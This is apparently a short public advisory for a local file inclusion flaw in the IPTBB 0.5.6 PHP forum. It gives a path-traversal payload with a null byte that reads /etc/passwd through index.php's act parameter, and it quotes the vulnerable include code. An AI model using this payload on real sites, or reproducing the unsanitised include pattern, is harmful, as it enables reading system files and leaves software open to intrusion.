IPTBB 0.5.6 (index.php act) Local File Inclusion Vulnerability
==============================================================



Exploit found by sToRm

IPTBB is a free forum system built using PHP and mysql.
Local File Inclusion

Local File Inclusion
--------------------

index.php?act=../../../../../../etc/passwd%00


function action($page){
	$page="main/".$page.".php";
	//Include the template maker
	//Get the settings
$setting = array();
$sql = mysql_query(" SELECT * FROM `iptbb_settings` ");

while ( $row = mysql_fetch_array( $sql ) ){
	$setting["{$row[&#039;name&#039;]}"] = $row[&#039;value&#039;];
}

	require_once(&#039;tpl.class.php&#039;);
	$tpl = new template;
	$fileurl = &#039;templates/&#039;;
	$template = $setting[&#039;template&#039;] . &#039;/&#039;;
	include($page);
}



